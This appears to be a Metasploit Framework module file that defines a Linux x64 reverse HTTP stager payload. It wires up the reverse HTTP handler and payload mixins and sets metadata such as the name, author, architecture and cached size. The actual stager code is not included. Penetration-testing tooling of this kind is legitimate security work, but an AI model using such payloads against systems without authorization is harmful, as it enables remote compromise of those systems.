##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/linux/x64/reverse_http'

module Metasploit4

  CachedSize = 501

  include Msf::Payload::Stager
  include Msf::Payload::Linux
  include Msf::Payload::Linux::ReverseHttp_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Linux x64 Reverse HTTP Stager',
      'Description' => 'Tunnel communication over HTTP',
      'Author'      => 'Jim Shaver',
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86_64,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'sockrdi http',
      'Stager'      => { 'Payload' => '' }))
  end

end
